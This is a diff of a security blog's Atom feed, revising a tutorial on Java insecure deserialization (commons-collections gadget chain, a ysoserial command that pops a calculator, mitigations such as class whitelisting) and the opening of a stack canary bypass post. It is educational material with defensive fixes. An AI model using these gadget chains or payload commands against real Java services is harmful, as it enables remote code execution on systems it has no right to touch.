@@ -4,7 +4,7 @@
   <title><![CDATA[Greyshell's Diary]]></title>
   <link href="http://greyshell.github.io/atom.xml" rel="self"/>
   <link href="http://greyshell.github.io/"/>
-  <updated>2020-04-09T04:09:33-07:00</updated>
+  <updated>2020-05-15T01:06:45-07:00</updated>
   <id>http://greyshell.github.io/</id>
   <author>
     <name><![CDATA[Abhijit Sinha]]></name>
@@ -15,25 +15,24 @@
   
   <entry>
     <title type="html"><![CDATA[Insecure Deserialization in Java]]></title>
-    <link href="http://greyshell.github.io/blog/2019/11/22/java-insecure-deserialization/"/>
+    <link href="http://greyshell.github.io/blog/2019/11/22/insecure-deserialization-java/"/>
     <updated>2019-11-22T22:17:55-08:00</updated>
-    <id>http://greyshell.github.io/blog/2019/11/22/java-insecure-deserialization</id>
-    <content type="html"><![CDATA[<p>I was always curious how the actual remote code execution occurs during the Insecure Deserialization process. So I thought of giving a try to understand the known bad gadgets from <code>commons-collections-3.2.2.jar</code> and develop the entire chain from the scratch.</p>
+    <id>http://greyshell.github.io/blog/2019/11/22/insecure-deserialization-java</id>
+    <content type="html"><![CDATA[<p>I was always curious about how the actual remote code execution occurs during the Insecure Deserialization process. So I thought of giving a try to understand the known harmful gadgets from <code>commons-collections-3.2.2.jar</code> and develop the entire chain from scratch.</p>
 
 <!-- more -->
 
 
 <h2>Serialization</h2>
 
-<p>Before directly jump into the <code>gadget chain</code>, the lets start with the fundamental of <code>Serialization</code> / <code>Deserialization</code> process and try to understand the <strong>root cause</strong>.</p>
+<p>Before directly jump into the <code>gadget chain</code> preparation, let&rsquo;s try to understand the root cause of &ldquo;Insecure Deserialization&rdquo;.</p>
 
-<blockquote><p>Serializable is a <strong>marker interface</strong>. It has no <code>data member</code> and <code>method</code>.</p>
+<blockquote><p>Serializable is a <strong>marker interface</strong>. It has no <code>data member</code> and <code>method.</code>
+It is used to &ldquo;mark&rdquo; java classes so that objects of these classes may get a certain capability.</p></blockquote>
 
-<p>It is used to “mark" java classes so that objects of these classes may get certain capability.</p></blockquote>
+<p>The fundamental <code>purpose</code> of serialization is to <code>convert</code> the <code>data structure</code> (i.e., state of an object) into a <code>format</code> (for Example: <code>byte stream</code>) that can be <code>stored</code> and <code>transmitted</code> over a network link for future <code>consumption.</code></p>
 
-<p>The fundamental <code>purpose</code> of serialization is to <code>convert</code> the <code>data structure</code> (i.e state of an object) into a <code>format</code> (for example: <code>byte stream</code>) that can be <code>stored</code> and <code>transmitted</code> over a network link for future <code>consumption</code>.</p>
-
-<p><strong>Example</strong>:</p>
+<p><strong> Example</strong>:</p>
 
 <p>Serialize the <code>User</code> class.</p>
 
@@ -175,13 +174,13 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/ser.png" alt="ser" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/ser.png" alt="ser" /></p>
 
 <h2>Deserialization</h2>
 
 <p>Deserialization is the reverse process where the <code>byte stream</code> is used to <code>recreate</code> the <code>actual</code> Java object in memory.</p>
 
-<p><strong>Example</strong>:</p>
+<p><strong> Example</strong>:</p>
 
 <p>Deserialize <code>User</code> class.</p>
 
@@ -242,22 +241,22 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/dser.png" alt="dser" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/dser.png" alt="dser" /></p>
 
 <p>Recreate the same <code>asinha</code> object in the memory.</p>
 
-<p>However due to <code>transient</code> and <code>static</code> keyword, the <code>uid</code> and <code>password</code> fields have only the default values.</p>
+<p>However, due to <code>transient</code> and <code>static</code> keyword, the <code>uid</code> and <code>password</code> fields have only the default values.</p>
 
 <h2>The Bug</h2>
 
 <ol>
-<li><p>The <code>readObject</code> method of <code>java.io.ObjectInputStream</code> is a vulnerable method.</p></li>
-<li><p>During the Deserialization process, the <code>readObject()</code> method is always <code>being</code> called and it can <code>construct</code> any sort of <code>Serializable</code> object that can be found on the Java <code>classpath</code> before passing it back to the <code>caller</code> for the <code>type_check</code>.</p></li>
-<li><p><code>Exception</code> can only happen if type miss match occurs between the return object and expected object.</p></li>
+<li><p>The <code>readObject</code> method of <code>java.io.ObjectInputStream</code> is vulnerable.</p></li>
+<li><p>During the Deserialization process, the <code>readObject()</code> method is always <code>being</code> called, and it can <code>construct</code> any sort of <code>Serializable</code> object that can be found on the Java <code>classpath</code> before passing it back to the <code>caller</code> for the <code>type_check.</code></p></li>
+<li><p><code>Exception</code> can only happen if a type miss-match occurs between the return object and the expected object.</p></li>
 </ol>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/bad_dser.png" alt="bad_dser" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/bad_dser.png" alt="bad_dser" /></p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -275,7 +274,7 @@
 
 <ul>
 <li>Remote code execution through property oriented programming(i.e <code>POP</code>) / Gadget Chaining.</li>
-<li>Bypass authorization / escalate privilege via Insecure Direct Object Reference if the signature of that object is not verified.</li>
+<li>Bypass authorization / escalate privilege via Insecure Direct Object Reference if the object&rsquo;s signature is not verified.</li>
 <li>DoS like consuming the <code>Heap</code> memory.</li>
 </ul>
 
@@ -442,7 +441,7 @@
 
 <p>Result:</p>
 
-<p>If we supply that <code>base64</code> encoded bad object through command_line argument then during Deserialization process, it consumes <code>100%</code> cpu cycle.</p>
+<p>If we supply that <code>base64</code> encoded evil object through command_line argument, then during the Deserialization process, it consumes <code>100%</code> CPU cycle.</p>
 
 <p>Following interesting payloads will directly <code>kill</code> the process.</p>
 
@@ -497,14 +496,14 @@
 
 <h2>How to Exploit</h2>
 
-<p>From the blackbox angle, use <code>ysoserial.jar</code> and iterate different payloads to generate the serialized object.</p>
+<p>The black box angle uses <code>ysoserial.jar</code> and iterates different payloads to generate the serialized object.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='bash'><span class='line'>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 gnome-calculator &gt; /root/code-dev/java/demo_insecure_deserialization/Serialization/bad_serialized_object_ysoserial.ser
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/ysoserial_cal.png" alt="ysoserial" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/ysoserial_cal.png" alt="ysoserial" /></p>
 
 <p>Alternate:</p>
 
@@ -516,7 +515,7 @@
 <h2>How to Fix</h2>
 
 <ol>
-<li>Don’t blindly accept serialized objects from <code>untrusted</code> sources. Implement integrity check / sign the serialized object to prevent hostile object creation / tampering.</li>
+<li>Don&rsquo;t blindly accept serialized objects from <code>untrusted</code> sources. Implement integrity check / sign the serialized object to prevent hostile object creation/tampering.</li>
 <li>Whitelist based approach to harden own <code>java.io.ObjectInputStream</code>:
 
 <ol>
@@ -644,13 +643,13 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/fix.png" alt="fix" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/fix.png" alt="fix" /></p>
 
 <ol>
-<li><p>Virtual patching / JVM wide fix: Harden all <code>java.io.ObjectInputStream</code> usage with an Agent through a blacklist. Example: <code>contrast-rO0</code>.</p></li>
-<li><p>The <code>readObject()</code> method should be inside <code>try / catch</code> block because if there is any mismatch occurs between the <code>serialized</code> object and <code>expected</code> object during type_check then the <code>Exception</code> has to be handled properly.</p></li>
-<li><p><code>transient</code> keyword is used NOT to <code>serialize</code> a variable like <code>password</code> field. When JVM comes across <code>transient</code> or <code>static</code> keyword, it ignores original value of the variable and save <code>default</code> value of that variable data type.</p></li>
-<li><p>Some objects may be forced to implement <code>Serializable</code> due to their hierarchy. To guarantee that your application objects can&rsquo;t be deserialized, a <code>readObject()</code> method should be declared (with a <code>final</code> modifier) which always throws an exception:</p></li>
+<li>Virtual patching / JVM wide fix: Harden, all <code>java.io.ObjectInputStream</code> usage with an Agent through a blacklist. Example: <code>contrast-rO0</code>.</li>
+<li>The <code>readObject()</code> method should be inside the <code>try/catch</code> block because any mismatch occurs between the <code>serialized</code> object and <code>expected</code> object during type_check, then the <code>Exception</code> has to be handled properly.</li>
+<li><code>transient</code> keyword is used not to <code>serialize</code> a variable like the <code>password</code> field. When JVM comes across <code>transient</code> or <code>static</code> keyword, it ignores the original value of the variable and saves the <code>default</code> value of that variable data type.</li>
+<li>Some objects may be forced to implement <code>Serializable</code> due to their hierarchy. To guarantee that your application objects can&rsquo;t be deserialized, a <code>readObject()</code> method should be declared (with a <code>final</code> modifier) which always throws an exception:</li>
 </ol>
 
 
@@ -664,31 +663,31 @@
 
 
 <ol>
-<li><p>In current Java, Java Security Manager does not allow blacklisted classes to be serialized and by default <code>enableUnsafeSerialization</code> is set to <code>FALSE</code>.</p></li>
-<li><p>Detective control: <code>Log</code> the exceptions and failures that happens during deserialization.</p></li>
+<li>In current Java, Java Security Manager does not allow blacklisted classes to be serialized, and the <code>enableUnsafeSerialization</code> is set to <code>FALSE.</code></li>
+<li>Detective control: <code>Log</code> the exceptions and failures that happen during deserialization.</li>
 </ol>
 
 
-<blockquote><p>DoS is unavoidable if the expected object type is HashSet / HashMap / arraylist.</p></blockquote>
+<blockquote><p>DoS is unavoidable if the expected object type is HashSet / HashMap / ArrayList.</p></blockquote>
 
 <h2>How to inspect Java libraries and <code>classpaths</code> for Gadget Chains</h2>
 
-<p><strong>Automated approach</strong>: In order to find the existance of one / more gadget chains, run <code>Gadget Inspector</code> on all libraries (i.e <code>commons-collections-3.2.2.jar</code>) present in the Java classpaths.</p>
+<p><strong>Automated approach</strong>: To find the existence of one / more gadget chains, run <code>Gadget Inspector</code> on all libraries (i.e. <code>commons-collections-3.2.2.jar</code>) present in the Java classpaths.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">java</span> <span class="o">-</span><span class="n">Xmx2G</span> <span class="o">-</span><span class="n">jar</span> <span class="n">build</span><span class="o">/</span><span class="n">libs</span><span class="o">/</span><span class="n">gadget</span><span class="o">-</span><span class="n">inspector</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">JavaExternalLibs</span><span class="o">/</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">-</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="na">jar</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>The tool found 1 <code>gadget chains</code> and saved the result in <code>gadget-chains.txt</code>.</p>
+<p>The tool found 1 <code>gadget chains</code> and saved the result in <code>gadget-chains.txt.</code></p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/gadget-inspector.png" alt="" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/gadget-inspector.png" alt="" /></p>
 
 <p><strong>Limitation of the tool</strong>:</p>
 
 <ul>
-<li>Not always an <code>exploit</code> can be build from the result.</li>
-<li>Can produce <code>false negative</code> result.</li>
+<li>Not always an <code>exploit</code> can be built from the result.</li>
+<li>It can produce a <code>false negative</code> effect.</li>
 </ul>
 
 
@@ -714,10 +713,10 @@
 
 <h3>Command Execution using <code>Runtime</code></h3>
 
-<blockquote><p>First lets understand, how we can execute a command in Java.</p></blockquote>
+<blockquote><p>First, let&rsquo;s understand how we can execute a command in Java.</p></blockquote>
 
 <ul>
-<li>We can use <code>Runtime</code> Object in Java to execute system command (i.e Running the gnome-calculator)</li>
+<li>We can use the <code>Runtime</code> Object in Java to execute system command (i.e., Running the gnome-calculator)</li>
 </ul>
 
 
@@ -760,11 +759,11 @@
 
 <h3>Reflection API</h3>
 
-<blockquote><p>What are the other ways, we can execute a command in Java.</p></blockquote>
+<blockquote><p>What are the other ways we can execute a command in Java.</p></blockquote>
 
 <ul>
-<li><p>Reflection is an API which is used to <code>examine</code> or <code>modify</code> the behavior of methods, classes, interfaces at <code>runtime</code>.</p></li>
-<li><p><strong>Key Point:</strong> Through reflection API, we can <code>invoke</code> <code>methods</code> at <code>runtime</code> irrespective of the access specifier used with them.</p></li>
+<li><p>Reflection is an API that is used to <code>examine</code> or <code>modify</code> the behavior of methods, classes, interfaces at <code>runtime.</code></p></li>
+<li><p><strong>Key Point:</strong> Through reflection API, we can <code>invoke</code> <code>methods</code> at <code>runtime</code> irrespective of the access specifier used.</p></li>
 </ul>
 
 
@@ -813,13 +812,13 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Executing the gnome-calculator using Reflection API.</p>
+<p>Execute the gnome-calculator using Reflection API.</p>
 
 <h3>Transformer</h3>
 
 <ul>
 <li><strong>Key Point:</strong> A Transformer transforms an <code>input</code> object to an <code>output</code> object through <code>transform()</code> method.</li>
-<li>It doesn’t change the input object.</li>
+<li>It doesn&rsquo;t change the input object.</li>
 <li>Mainly used for:
 
 <ol>
@@ -890,14 +889,14 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Passing a <code>String</code>object to a <code>Transformer</code> and <code>transform()</code> method reverse the input <code>String</code> and finally returns the <code>String</code> object.</p>
+<p>Passing a <code>String</code>object to a <code>Transformer</code> and <code>transform()</code> method reverses the input <code>String</code> and finally returns the <code>String</code> object.</p>
 
 <p>Different categories of <code>Transformers</code>:</p>
 
 <h3>ConstantTransformer</h3>
 
 <ul>
-<li><strong>Key Point:</strong> Always returns the <code>same</code> object <code>specified during initialization</code>.</li>
+<li><strong>Key Point:</strong> Always returns the <code>same</code> object <code>specified during initialization.</code></li>
 </ul>
 
 
@@ -975,8 +974,8 @@
 <h3>InvokerTransformer</h3>
 
 <ul>
-<li>Takes a <code>method name</code> with optional parameters during initialization.</li>
-<li>On <code>transform</code>, calls that <code>method</code> for the <code>object</code> provided with the parameters.</li>
+<li>It takes a <code>method name</code> with optional parameters during initialization.</li>
+<li>On <code>transform,</code> calls that <code>method</code> for the <code>object</code> provided with the parameters.</li>
 </ul>
 
 
@@ -1031,11 +1030,11 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Invoke the <code>toString()</code> method of a Dashboard object via <code>InvokerTransformer</code>.</p>
+<p>Invoke the <code>toString()</code> method of a Dashboard object via <code>InvokerTransformer.</code></p>
 
-<p>While initializing the <code>InvokerTransformer</code>, we need to install a method by supplying method_name, argument_type and argument.</p>
+<p>While initializing the <code>InvokerTransformer,</code> we need to install a method by supplying method_name, argument_type, and argument.</p>
 
-<p>We can’t install any arbitrary method here. The method should be present on the same class whose object we are going to pass on the transform() method.</p>
+<p>We can&rsquo;t install any arbitrary method here. The method should be present in the same class whose object we are going to pass on the transform() method.</p>
 
 <h3>Command Execution by <code>combining</code> reflection API, ConstantTransformer and InvokerTransformer</h3>
 
@@ -1146,12 +1145,12 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Opening the <code>gnome-calculator</code> by chaining three transformers and executing the <code>transform()</code> method.</p>
+<p>Open the <code>gnome-calculator</code> by chaining three transformers and executing the <code>transform()</code> method.</p>
 
 <h3>ChainedTransformer</h3>
 
 <ul>
-<li>Shorten / compact the code for code execution.</li>
+<li>Shorten/compact the code for code execution.</li>
 <li><strong>Key Point:</strong> Takes an <code>array of transformers</code> during initialization and <code>chains</code> them carefully maintaining their execution order.</li>
 </ul>
 
@@ -1223,7 +1222,7 @@
 
 <blockquote><ul>
 <li><p>In order to trigger the command execution, somehow we need to execute <code>ChainedTransformer.transform("any_key")</code> method.</p></li>
-<li><p>However, still we need to understand few more data structures to connect the dots.</p></li>
+<li><p>However, we still need to understand a few more data structures to connect the dots.</p></li>
 </ul>
 </blockquote>
 
@@ -1372,11 +1371,11 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120223312696.png" alt="image-20191120223312696" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120223312696.png" alt="image-20191120223312696" /></p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120222926864.png" alt="image-20191120222926864" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120222926864.png" alt="image-20191120222926864" /></p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120223152778.png" alt="image-20191120223152778" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120223152778.png" alt="image-20191120223152778" /></p>
 
 <h3>Command Execution by <code>combining</code> ChainedTransformer and LazyMap</h3>
 
@@ -1551,18 +1550,18 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120230402262.png" alt="image-20191120230402262" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120230402262.png" alt="image-20191120230402262" /></p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120230500084.png" alt="image-20191120230500084" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120230500084.png" alt="image-20191120230500084" /></p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120230532545.png" alt="image-20191120230532545" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120230532545.png" alt="image-20191120230532545" /></p>
 
 <h3>HashBag</h3>
 
 <ol>
 <li>A Collection that <code>counts</code> the number of times an object <code>appears</code> in the collection.</li>
 <li>Backed by an internal <code>HashMap</code> object.</li>
-<li>While adding any Object, first it’s <code>hashcode()</code> is calculated. Based on that hashcode / index it update the underlying <code>HashMap</code> table entry.</li>
+<li>While adding any Object, first it&rsquo;s <code>hashcode()</code> is calculated. Based on that hashcode/index, it updates the underlying <code>HashMap</code> table entry.</li>
 <li><strong>Key Point:</strong> <code>hashbag.add(tiedmapentry)</code> method => <code>tiedmapentry.hashcode()</code> method.</li>
 </ol>
 
@@ -1634,7 +1633,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191120232856545.png" alt="image-20191120232856545" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191120232856545.png" alt="image-20191120232856545" /></p>
 
 <h3>Recap</h3>
 
@@ -1644,8 +1643,8 @@
 
 
 <blockquote><ol>
-<li>This <code>LazyMap</code> is actually backed by a empty <code>HashMap</code>.</li>
-<li>This <code>LazyMap</code> can also use the factory class <code>ChainedTransformer</code> that generates a value dynamically through the <code>transform()</code> method when it is presented with an <code>invalid</code> key.</li>
+<li>This <code>LazyMap</code> is backed by an empty <code>HashMap.</code></li>
+<li>This <code>LazyMap</code> can also use the factory class <code>ChainedTransformer</code> that generates a value dynamically through the <code>transform()</code> method when presented with an <code>invalid</code> key.</li>
 <li><strong>Key Point:</strong> Finally it updates that entry(i.e key:value pair) into the <code>HashMap</code>.</li>
 <li>As the initial <code>HashMap</code> is empty, so any <code>key</code> supplied through <code>TiedMapEntry</code> can trigger the <code>transform()</code> method.</li>
 </ol>
@@ -1682,19 +1681,17 @@
 
 <h3>The Problem</h3>
 
-<p>We can serialize this <code>HashBag</code> object to generate the payload but during the serialization process, <code>lazymap.get(“invalid_key”)</code> is called once. So the underlying <code>HashMap</code> is <code>updated</code> with the <code>invalid_key:derived_value</code> entry.</p>
+<p>We can serialize this <code>HashBag</code> object to generate the payload but during the serialization process, <code>lazymap.get("invalid_key")</code> is called once. So the underlying <code>HashMap</code> is <code>updated</code> with the <code>invalid_key:derived_value</code> entry.</p>
 
-<p>During deserialization process, when <code>TiedMapEntry.hashcode()</code> => <code>lazymap.get(this.key)</code> call occurs, then <code>ChainedTransformer.transform(key)</code> method will not be called.</p>
-
-<p>Because the underlying <code>HashMap</code> is <code>updated</code> with the entry so the <code>LazyMap</code> does not need to derive the value for that key again through <code>transform()</code> method.</p>
+<p>During deserialization process, when <code>TiedMapEntry.hashcode()</code> => <code>lazymap.get(this.key)</code> call occurs, then <code>ChainedTransformer.transform(key)</code> method will not be called because <code>LazyMap</code> does not need to derive the value for that key again through the <code>transform()</code> method. Underlying <code>HashMap</code> is already <code>updated</code> with the entry.</p>
 
 <h3>The Solution</h3>
 
-<p>The most important thing to taken care, is</p>
+<p>The most important thing to taken care is</p>
 
 <ol>
-<li><p>During the serialization process, we need to wrap a <code>TiedMapEntry</code> Object in side a <code>HashBag</code> object, but somehow we need to <code>stop</code> the invocation of <code>TiedMapEntry.hashcode()</code> method when we add the TidemapEntry object into the <code>HashBag's</code> <code>HashMap</code> via  <code>add()</code> method.</p></li>
-<li><p>If we can do this then the underlying <code>LazyMap's</code> <code>HashMap</code> will not be <code>updated</code> with the <code>invalid_key:derived_value</code> entry.</p></li>
+<li>During the serialization process, we need to wrap a <code>TiedMapEntry</code> Object inside a <code>HashBag</code> object, but somehow we need to <code>stop</code> the invocation of <code>TiedMapEntry.hashcode()</code> method when we add the TidemapEntry object into the <code>HashBag's</code> <code>HashMap</code> via  <code>add()</code> method.</li>
+<li>If we can do this, then the underlying <code>LazyMap's</code> <code>HashMap</code> won&rsquo;t get <code>updated</code> with the <code>invalid_key:derived_value</code> entry.</li>
 </ol>
 
 
@@ -1712,9 +1709,9 @@
 </li>
 <li>As you can observe, till this point, <code>TiedMapEntry.hashcode()</code> is not called anywhere.</li>
 <li>Serialize this <code>HashBag</code> Object.</li>
-<li>During the deserialization process, program will be trying to recreate the same object(i.e <code>HashBag</code>) in the process memory.</li>
-<li>This <code>HashBag</code> => underlying <code>HashMap</code> table should be having one entry, where key= <code>TiedMapEntry</code> Object and count/ value =1. So in order to recreate that entry inside the <code>HashBag’s</code> <code>HashMap's</code> table, the index of the table needs to be known so <code>TiedMapEntry.hashcode()</code> method will be called to calculate that index dynamically.</li>
-<li>The key point is <code>TiedMapEntry.hashcode()</code> method will be called first time which basically triggers the code execution.</li>
+<li>During the deserialization process, the program tries to recreate the same object(i.e., <code>HashBag</code>) in the process memory.</li>
+<li>This <code>HashBag</code> => underlying <code>HashMap</code> table should be having one entry, where key= <code>TiedMapEntry</code> Object and count/ value =1. So, to recreate that entry inside the <code>HashBag's</code> HashMap&rsquo;s<code>table, the table's index needs to be known. Due to this,</code>TiedMapEntry.hashcode()` is called to calculate that index dynamically.</li>
+<li>Here the key point is, <code>TiedMapEntry.hashcode()</code> method is getting called the first time, which triggers the code execution.</li>
 </ol>
 
 
@@ -1882,7 +1879,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>It seems the <code>Java Security Manager</code> detects the known bad gadgets.</p>
+<p>It seems that the <code>Java Security Manager</code> detects the known <code>bad</code> gadgets.</p>
 
 <p>By default, serialization support for <code>org.apache.commons.collections.functors.InvokerTransformer</code> is <code>disabled</code>.</p>
 
@@ -2048,33 +2045,33 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191121213224578.png" alt="" /></p>
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191121213224578.png" alt="" /></p>
 
-<h3>Video Walk through: Debugging the Deserialization Flow</h3>
+<h3>Video Walkthrough: Debugging the Deserialization Flow</h3>
 
-<p><a href="https://vimeo.com/374834418"><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/image-20191121223509399.png" alt="Demystifying a Gadget Chain - Java Deserialization" /></a></p>
+<p><a href="https://vimeo.com/374834418"><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/image-20191121223509399.png" alt="Demystifying a Gadget Chain - Java Deserialization" /></a></p>
 
 <h2>Final Thoughts</h2>
 
-<p>If we fix our code and use the <code>safeObjectInputStream</code> during deserialization, then following things will happen while unwrapping the serialized object:</p>
+<p>If we fix our code and use the <code>safeObjectInputStream</code> during deserialization, then the following things happen while unwrapping the serialized object:</p>
 
 <ol>
 <li>First, it resolves the <code>HashBag</code> Class.</li>
-<li>Then it checks if that class is present inside the <code>whitelist</code>.
+<li>Then it checks if that class is present inside the <code>whitelist.</code>
 
 <ul>
-<li>If that class <code>IS_NOT_FOUND</code> inside the <code>whitelist</code> then it throws <code>Exception</code>.</li>
-<li>We don&rsquo;t have <code>HashBag</code> in our whitelist. So the we&rsquo;ll get the <code>Exception</code> and attack will not be sucessful.</li>
+<li>If that class <code>IS_NOT_FOUND</code> inside the <code>whitelist,</code> then it throws <code>Exception.</code></li>
+<li>We don&rsquo;t have <code>HashBag</code> in our whitelist. So then we&rsquo;ll get the <code>Exception,</code> and the attack won&rsquo;t be successful.</li>
 </ul>
 </li>
 </ol>
 
 
-<p>However, if that class <code>IS_FOUND</code> inside the <code>whitelist</code> then it tries to resolves the next wrapped class (in our case that is <code>TiedMapEntry</code>) and repeats the step 2.</p>
+<p>However, if that class <code>IS_FOUND</code> inside the <code>whitelist,</code> then it tries to resolve the next wrapped class (in our case that is <code>TiedMapEntry</code>) and repeats step 2.</p>
 
-<blockquote><p>If all classes wrapped in the <code>serialized</code> object are present inside the our <code>whitelist</code> then the entire process will be continued and we can anticipate the <code>calculator</code> again.</p></blockquote>
+<blockquote><p>If all classes wrapped in the <code>serialized</code> object are present inside our <code>whitelist,</code> then the entire process won&rsquo;t continue, and we can anticipate the <code>calculator</code> again.</p></blockquote>
 
-<p><code>whitelist</code> the following classes to run <code>calculator</code>.</p>
+<p><code>whitelist</code> the following classes to run <code>calculator.</code></p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2179,17 +2176,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2019/java_insecure_deserialization/calc_rce.png" alt="" /></p>
-
-<p><strong>Key take away:</strong></p>
-
-<p>The whitelisting based prevention won&rsquo;t work if that whitelist contains</p>
-
-<ul>
-<li>All classes that used to build the chain => <code>RCE</code></li>
-<li>HashSet / HashMap / arraylist => <code>DoS</code></li>
-</ul>
-
+<p><img src="http://greyshell.github.io/artifacts/insecure_deserialization_java.assets/calc_rce.png" alt="" /></p>
 
 <h2>References</h2>
 
@@ -2206,10 +2193,10 @@
   
   <entry>
     <title type="html"><![CDATA[Canary Bypass]]></title>
-    <link href="http://greyshell.github.io/blog/2019/07/16/canary-bypass/"/>
+    <link href="http://greyshell.github.io/blog/2019/07/16/canary-bypass02/"/>
     <updated>2019-07-16T20:33:35-07:00</updated>
-    <id>http://greyshell.github.io/blog/2019/07/16/canary-bypass</id>
-    <content type="html"><![CDATA[<p>Linux binary exploitation is very <code>interesting</code> topic. Thanks to my good friend <a href="https://dhavalkapil.com/">vampire</a>, he gave me this chellenge and helped me to understand a stack <code>canary</code> bypass technique.</p>
+    <id>http://greyshell.github.io/blog/2019/07/16/canary-bypass02</id>
+    <content type="html"><![CDATA[<p>Linux binary exploitation is a very <code>interesting</code> topic. Thanks to my good friend <a href="https://dhavalkapil.com/">vampire</a>, he gave me this challenge and helped me to understand a stack <code>canary</code> bypass technique.</p>
 
 <!-- more -->
 
@@ -2255,9 +2242,21 @@
 <span class='line-number'>25</span>
 <span class='line-number'>26</span>
 <span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
 </pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
 </span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
 </span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// this is new</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/*</span>
+</span><span class='line'><span class="cm">copy the entire in this multiline comment</span>
+</span><span class='line'><span class="cm">*/</span>
 </span><span class='line'>
 </span><span class='line'><span class="k">struct</span> <span class="n">contact</span> <span class="p">{</span>
 </span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
@@ -2294,7 +2293,7 @@
 <p><strong>Exploit Scenario</strong></p>
 
 <ol>
-<li>During enumerating a system as a low privilege user, you found that the <code>suid</code> bit is set for this binary and the effective user is <code>root</code>.Now you would like to <code>escalate</code> your privilege to <code>root</code>.</li>
+<li>During enumerating a system as a low privilege user, you found that the <code>suid</code> bit is <code>set</code> and the effective user is <code>root.</code> Now you would like to <code>escalate</code> your privilege to <code>root.</code></li>
 <li>This binary is running on the network and you would like to break that remote system and get the <code>shell</code> access.</li>
 </ol>
 
@@ -2325,21 +2324,21 @@
 </span><span class='line'>cat /proc/sys/kernel/randomize_va_space =&gt; 2 (ASLR enabled by default, most secure)</span></code></pre></td></tr></table></div></figure>
 
 
-<h2>High Level Analysis</h2>
